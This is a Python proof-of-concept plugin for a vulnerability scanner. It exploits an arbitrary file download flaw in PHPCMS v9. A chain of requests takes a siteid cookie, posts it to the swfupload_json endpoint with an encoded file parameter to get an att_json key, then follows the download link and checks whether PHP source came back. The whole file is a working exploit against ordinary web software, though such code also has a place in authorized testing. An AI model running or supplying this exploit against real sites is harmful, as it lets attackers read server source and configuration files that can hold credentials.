#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import re
from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'phpcms v9 download'
        self.keyword = ['phpcms', 'download']
        self.info = 'phpcms v9 download'
        self.type = 'download'
        self.level = 'high'
        Script.__init__(self, target=target, server_type=self.server_type)


    def prove(self):
        self.get_url()
        if self.base_url:
            headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4"}
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.base_url, '../phpcms/'),
                self.url_normpath(self.url, 'phpcms/'),
                self.url_normpath(self.url, '../phpcms/'),
            ]))
            for path in path_list:
                url1 = path +"/index.php?m=wap&c=index&a=init&siteid=1"
                res1 = self.curl('get',url1,headers = headers)
                if res1 !=None:
                    for cookie in res1.cookies:
                        if '_siteid' in cookie.name:
                            userid = cookie.value

                            url2 = path +"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D.p%25253chp"
                            _data1 = {'userid_flash': userid}
                            res2 = self.curl('post', url=url2, data=_data1,headers = headers)
                            if res2 != None:
                                for cookie in res2.cookies:
                                    if '_att_json' in cookie.name:
                                        att_json = cookie.value

                                        url3 = path +"/index.php?m=content&c=down&a=init&a_k=" + att_json
                                        res3 =  self.curl('get', url3,headers = headers)

                                        if res3 !=None:
                                            file = re.findall(r'<a href="(.+?)"', res3.text)[0]
                                            url4 =  path + '/index.php' + file
                                            res4 = self.curl('get', url4,headers = headers)
                                            if res4 !=None:
                                                if  '<?php' in res4.text:
                                                    self.flag = 1
                                                    self.req.append({"url": url4})
                                                    self.res.append({"info": url1, "key": "phpcms v9 download",'connect':res4.text})
